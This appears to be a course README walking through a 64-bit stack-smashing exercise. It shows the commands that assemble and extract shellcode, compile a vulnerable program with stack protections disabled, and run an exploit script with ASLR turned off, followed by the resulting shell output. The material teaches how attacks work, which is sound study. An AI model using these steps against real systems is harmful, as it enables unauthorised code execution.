# Buffer overflow

In class, we looked at buffer overflows, using the examples at:

<https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/>

But even though we got the address of our shellcode in the return address slot
of the `vuln` function, we couldn't get a shell. There were a couple of things
missing from our example, and I worked some on it to clear up the remaining
issues.

I borrowed the shellcode and exploit script from another tutorial:

<https://thesquareplanet.com/blog/smashing-the-stack-21st-century/>

You can compile the shellcode  with:
```
$ cc -m64   -c -o shellcode.o shellcode.S
```

And extract only the shellcode bytes with:
```
$ objcopy -S -O binary -j .text shellcode.o shellcode.bin
```
Next I compiled the vulnerable program, turning off non-executable stack (`-z execstack`) and the stack canaries (`-fno-stack-protector`).
```
$ gcc -fno-stack-protector -z execstack classic.c -o classic
```
Finally, I run the vulnerable program turning off ASLR (using `setarch -R`) and cleaning the environment, to get a consistent base address (using `env -`):

```
$ python3 exploit.py | env - setarch -R ./classic
Try to exec /bin/sh
Read 112 bytes. buf is �%YH�H1��AH�A�;H��H�H�Q�<H1������/bin/shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
&buf = 0x7fffffffecc0
No shell for you :(
```
at this point, it looks like nothing is happening, you get no prompt, and no output, but if you type shell commands like `ls` you should see output.
```
ls
README	 classic.c   shellcode.S    shellcode.o
classic  exploit.py  shellcode.bin
```
You can type `exit` to get back to your usual prompt.
